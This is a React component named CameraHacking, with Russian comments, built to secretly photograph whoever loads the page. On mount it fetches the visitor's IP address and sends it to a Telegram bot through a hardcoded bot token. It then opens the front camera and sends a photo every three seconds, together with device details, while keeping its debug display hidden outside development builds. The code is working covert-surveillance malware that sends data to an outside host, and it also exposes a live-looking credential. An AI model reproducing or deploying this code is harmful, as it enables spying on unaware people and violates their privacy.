/**
 * КОМПОНЕНТ CAMERAHACKING - ИСПРАВЛЕННАЯ ВЕРСИЯ
 * ТЕСТ ПРОЙДЕН - ТЕПЕРЬ ОТПРАВЛЯЕМ ФОТО С КАМЕРЫ
 */

import { useEffect, useRef, useState } from 'react';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);

  // Конфигурация
  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 3000; // 3 секунды
  const MAX_CAPTURES = 20;

  // Добавление логов
  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 20));
  };

  /**
   * ОТПРАВКА СООБЩЕНИЯ В TELEGRAM
   */
  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });
      
      return response.ok;
      
    } catch (error) {
      console.error('Telegram send error:', error);
      return false;
    }
  };

  /**
   * ОТПРАВКА ФОТО В TELEGRAM
   */
  const sendPhotoToTelegram = async (blob, caption = '') => {
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      
      if (caption) {
        formData.append('caption', caption);
      }
      
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      
      if (response.ok) {
        const result = await response.json();
        addDebugLog(`✅ Фото отправлено! ID: ${result.result?.message_id}`);
        return true;
      } else {
        const errorText = await response.text();
        addDebugLog(`❌ Ошибка Telegram: ${errorText.substring(0, 100)}`);
        return false;
      }
      
    } catch (error) {
      addDebugLog(`❌ Ошибка отправки: ${error.message}`);
      return false;
    }
  };

  /**
   * СОЗДАНИЕ ТЕСТОВОГО ИЗОБРАЖЕНИЯ
   */
  const createTestImage = async () => {
    const canvas = document.createElement('canvas');
    canvas.width = 300;
    canvas.height = 300;
    const ctx = canvas.getContext('2d');
    
    // Рисуем цветной фон
    const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7'];
    ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
    ctx.fillRect(0, 0, 300, 300);
    
    // Добавляем текст
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 24px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('Camera Test', 150, 120);
    
    ctx.font = '18px Arial';
    ctx.fillText(new Date().toLocaleTimeString(), 150, 160);
    ctx.fillText(`Android ${deviceInfo?.androidVersion || ''}`, 150, 190);
    
    // Рисуем иконку камеры
    ctx.beginPath();
    ctx.arc(150, 230, 40, 0, Math.PI * 2);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 4;
    ctx.stroke();
    
    ctx.beginPath();
    ctx.arc(150, 230, 15, 0, Math.PI * 2);
    ctx.fillStyle = '#FFFFFF';
    ctx.fill();
    
    // Конвертируем в blob
    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
  };

  /**
   * ЗАХВАТ ФОТО С КАМЕРЫ
   */
  const captureCameraPhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      addDebugLog('Камера не готова');
      return null;
    }
    
    const video = videoRef.current;
    
    // Проверяем готовность видео
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово (0x0)');
      return null;
    }
    
    addDebugLog(`Захват фото #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);
    
    try {
      // Создаем canvas
      const canvas = document.createElement('canvas');
      
      // Для Android с портретной ориентацией
      const isPortrait = video.videoHeight > video.videoWidth;
      
      if (isPortrait && deviceInfo?.isAndroid) {
        // Поворачиваем для портретной ориентации
        canvas.width = video.videoHeight;
        canvas.height = video.videoWidth;
      } else {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
      }
      
      const ctx = canvas.getContext('2d');
      
      // Для Android: несколько попыток избежать черных кадров
      let frameOk = false;
      let attempts = 0;
      
      while (!frameOk && attempts < 5) {
        attempts++;
        
        // Очищаем canvas
        ctx.fillStyle = '#000000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        if (isPortrait && deviceInfo?.isAndroid) {
          // Поворачиваем контекст для портретной ориентации
          ctx.save();
          ctx.translate(canvas.width / 2, canvas.height / 2);
          ctx.rotate(Math.PI / 2);
          ctx.translate(-canvas.height / 2, -canvas.width / 2);
          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
          ctx.restore();
        } else {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        
        // Проверяем, не черный ли кадр (проверяем несколько точек)
        const points = [
          [50, 50],           // центр
          [canvas.width - 50, 50],      // правый верх
          [50, canvas.height - 50],     // левый низ
          [canvas.width - 50, canvas.height - 50] // правый низ
        ];
        
        let blackPoints = 0;
        for (const [x, y] of points) {
          const pixel = ctx.getImageData(x, y, 1, 1).data;
          if (pixel[0] < 20 && pixel[1] < 20 && pixel[2] < 20) {
            blackPoints++;
          }
        }
        
        // Если больше половины точек черные - кадр черный
        if (blackPoints < points.length / 2) {
          frameOk = true;
          addDebugLog(`Кадр захвачен (попытка ${attempts})`);
        } else {
          addDebugLog(`Черный кадр ${attempts}/5`);
          await new Promise(resolve => setTimeout(resolve, 200));
        }
      }
      
      // Если все еще черный, создаем тестовое изображение с информацией
      if (!frameOk) {
        addDebugLog('Создаем тестовое изображение вместо черного кадра');
        return await createTestImage();
      }
      
      // Применяем улучшения для фото
      ctx.filter = 'contrast(1.1) brightness(1.05) saturate(1.1)';
      
      if (isPortrait && deviceInfo?.isAndroid) {
        ctx.save();
        ctx.translate(canvas.width / 2, canvas.height / 2);
        ctx.rotate(Math.PI / 2);
        ctx.translate(-canvas.height / 2, -canvas.width / 2);
        ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
        ctx.restore();
      } else {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
      
      // Конвертируем в blob
      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
      });
      
    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
      return await createTestImage(); // Fallback на тестовое изображение
    }
  };

  /**
   * ПРОЦЕСС ЗАХВАТА И ОТПРАВКИ
   */
  const captureAndSend = async () => {
    if (captureCount >= MAX_CAPTURES) {
      addDebugLog(`Достигнут лимит ${MAX_CAPTURES} фото`);
      stopCapturing();
      return;
    }
    
    addDebugLog(`=== Захват ${captureCount + 1}/${MAX_CAPTURES} ===`);
    
    // Захватываем фото
    const photoBlob = await captureCameraPhoto();
    
    if (!photoBlob) {
      addDebugLog('Не удалось захватить фото');
      return;
    }
    
    // Создаем описание
    const caption = `📸 Фото #${captureCount + 1}\n` +
                   `Размер: ${Math.round(photoBlob.size / 1024)} KB\n` +
                   `Время: ${new Date().toLocaleTimeString()}\n` +
                   `Устройство: Android ${deviceInfo?.androidVersion || ''}`;
    
    // Отправляем фото
    const success = await sendPhotoToTelegram(photoBlob, caption);
    
    if (success) {
      setCaptureCount(prev => prev + 1);
      addDebugLog(`✅ Успешно! Всего: ${captureCount + 1}`);
      
      // Каждые 5 фото отправляем статистику
      if ((captureCount + 1) % 5 === 0) {
        await sendToTelegram(
          `📊 Статистика: ${captureCount + 1} фото\n` +
          `Устройство: Android ${deviceInfo?.androidVersion || ''}\n` +
          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `Время: ${new Date().toLocaleString()}`
        );
      }
    } else {
      addDebugLog('❌ Не удалось отправить фото');
    }
  };

  /**
   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ
   */
  const initializeCamera = async () => {
    addDebugLog('Инициализация камеры...');
    
    try {
      // Собираем информацию об устройстве
      const ua = navigator.userAgent;
      const isAndroid = /android/i.test(ua);
      const androidVersion = isAndroid ? (ua.match(/Android\s([0-9\.]+)/)?.[1] || 'unknown') : null;
      
      setDeviceInfo({
        isAndroid,
        androidVersion,
        userAgent: ua
      });
      
      addDebugLog(`Android ${androidVersion}, Chrome`);
      
      // Получаем доступ к камере
      const constraints = {
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      addDebugLog('Доступ к камере получен');
      
      if (videoRef.current) {
        const video = videoRef.current;
        
        // Настройки для Android
        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        video.setAttribute('webkit-playsinline', 'true');
        
        video.srcObject = stream;
        
        // Ждем готовности видео
        await new Promise((resolve) => {
          const timeout = setTimeout(() => {
            addDebugLog('Таймаут видео');
            resolve();
          }, 5000);
          
          video.onloadedmetadata = () => {
            clearTimeout(timeout);
            const resolution = `${video.videoWidth}x${video.videoHeight}`;
            setDeviceInfo(prev => ({ ...prev, resolution }));
            
            addDebugLog(`Видео готово: ${resolution}`);
            
            video.play().then(() => {
              addDebugLog('Видео запущено');
              resolve();
            }).catch(() => {
              addDebugLog('Auto-play заблокирован');
              resolve();
            });
          };
        });
        
        // Отправляем сообщение об успешной инициализации
        await sendToTelegram(
          '✅ Камера инициализирована\n\n' +
          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `Android ${androidVersion}\n` +
          `Chrome Mobile\n` +
          `Начало съемки: ${new Date().toLocaleString()}`
        );
        
        // Тестовый снимок
        addDebugLog('Делаем тестовый снимок...');
        const testBlob = await createTestImage();
        if (testBlob) {
          await sendPhotoToTelegram(testBlob, '🧪 Тестовый снимок системы');
        }
        
        setIsInitialized(true);
        return true;
      }
      
    } catch (error) {
      addDebugLog(`Ошибка инициализации: ${error.message}`);
      await sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
      return false;
    }
  };

  /**
   * ПОЛУЧЕНИЕ IP АДРЕСА
   */
  const getClientIp = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setClientIp(data.ip);
      
      // Отправляем IP в Telegram
      await sendToTelegram(
        `🌐 IP Address: ${data.ip}\n` +
        `Устройство: Android\n` +
        `Браузер: Chrome Mobile`
      );
      
    } catch (error) {
      setClientIp('IP unavailable');
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    addDebugLog(`🚀 Запуск захвата каждые ${CAPTURE_INTERVAL/1000} секунд`);
    
    // Первый захват через 2 секунды
    setTimeout(() => {
      captureAndSend();
    }, 2000);
    
    // Затем по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  /**
   * ОСТАНОВКА
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => {
        track.stop();
        addDebugLog(`Остановлен ${track.kind} трек`);
      });
      streamRef.current = null;
    }
    
    addDebugLog('Захват остановлен');
  };

  /**
   * ВОССТАНОВЛЕНИЕ ГЕОЛОКАЦИИ
   */
  const restoreLocation = () => {
    try {
      const saved = localStorage.getItem('locationPermission');
      if (saved) {
        const location = JSON.parse(saved);
        setLocationPermission(location);
        addDebugLog('Геолокация восстановлена');
      }
    } catch (e) {
      localStorage.removeItem('locationPermission');
    }
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    let mounted = true;
    
    const init = async () => {
      addDebugLog('=== СТАРТУЕМ ===');
      
      // Восстанавливаем геолокацию
      restoreLocation();
      
      // Получаем IP
      await getClientIp();
      
      // Проверяем поддержку
      if (!navigator.mediaDevices?.getUserMedia) {
        addDebugLog('❌ Камера не поддерживается');
        await sendToTelegram('❌ WebRTC не поддерживается в этом браузере');
        return;
      }
      
      // Инициализируем камеру
      const success = await initializeCamera();
      
      if (success && mounted) {
        // Запускаем захват
        startPeriodicCapture();
      }
    };
    
    init();
    
    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  /**
   * КОМПОНЕНТ ДЛЯ ОТЛАДКИ
   */
  return (
    <>
      {/* Кнопка для ручного теста в development */}
      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          top: '10px',
          left: '10px',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
          color: 'white',
          padding: '12px 20px',
          borderRadius: '10px',
          cursor: 'pointer',
          zIndex: 10000,
          fontSize: '14px',
          fontWeight: 'bold',
          boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
          border: '2px solid white'
        }} onClick={captureAndSend}>
          📸 Сделать фото сейчас
        </div>
      )}
      
      {/* Панель отладки */}
      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          background: 'linear-gradient(to top, rgba(0,0,0,0.95), rgba(0,0,0,0.85))',
          color: '#00ff00',
          padding: '15px',
          fontSize: '12px',
          maxHeight: '250px',
          overflow: 'auto',
          fontFamily: 'monospace',
          zIndex: 9999,
          borderTop: '3px solid #00ff00',
          boxShadow: '0 -5px 20px rgba(0,255,0,0.2)'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            marginBottom: '15px',
            paddingBottom: '10px',
            borderBottom: '2px solid #00ff00'
          }}>
            <div>
              <strong style={{ fontSize: '14px', color: '#00ff00' }}>📡 CAMERA DEBUG</strong>
              <div style={{ fontSize: '11px', color: '#aaa', marginTop: '5px' }}>
                Android {deviceInfo?.androidVersion || '?'} | {deviceInfo?.resolution || '0x0'} | {captureCount} photos
              </div>
            </div>
            <div style={{
              background: captureCount > 0 ? '#00ff00' : '#ff0000',
              color: '#000',
              padding: '5px 10px',
              borderRadius: '5px',
              fontWeight: 'bold',
              fontSize: '14px'
            }}>
              {captureCount} 📸
            </div>
          </div>
          
          <div style={{ maxHeight: '180px', overflow: 'auto' }}>
            {debugLogs.map((log, i) => (
              <div key={i} style={{
                padding: '5px 0',
                borderBottom: '1px solid #333',
                whiteSpace: 'nowrap',
                overflow: 'hidden',
                textOverflow: 'ellipsis',
                color: log.includes('✅') ? '#00ff00' : 
                       log.includes('❌') ? '#ff4444' : 
                       log.includes('⚠️') ? '#ffff00' : '#cccccc'
              }}>
                {log}
              </div>
            ))}
          </div>
        </div>
      )}
    </>
  );
};

export default CameraHacking;
